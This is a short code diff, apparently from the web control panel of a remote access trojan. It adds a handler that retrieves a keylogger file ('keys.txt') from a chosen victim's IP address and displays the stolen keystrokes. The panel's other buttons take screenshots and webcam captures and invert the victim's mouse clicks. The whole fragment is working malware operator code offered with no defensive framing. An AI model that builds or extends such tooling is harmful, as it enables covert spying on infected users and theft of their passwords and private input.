@@ -112,6 +112,13 @@
           });
       });
 
+    $("#keylog").on('click', function() { 
+            $.get("http://" + ips[$("#victim").val()] + "/keys.txt", function(data, status){
+                $("#lg-op-body").html(data);
+                $("#lg-op").modal('show');
+            });
+      });
+
     $("#screen").on('click', function() { 
             var random = Math.floor(Math.random() * 1000000) + 1;
            
@@ -264,7 +271,7 @@
       <h3>Telemetry.</h3>
         <button id="screen">Screenshot</button> <br/> <br/> 
         <button id="pic">Webcam Capture</button> <br/> <br/> 
-        <button id="keylogger">View Keylogger Logs</button> <br/> <br/> 
+        <button id="keylog">View Keylogger Logs</button> <br/> <br/> 
         
         <button id="keypressinv">Invert Mouse clicks</button> <br/> <br/> 
         <button id="keypressok">Default Mouse clicks</button> <br/> <br/> 
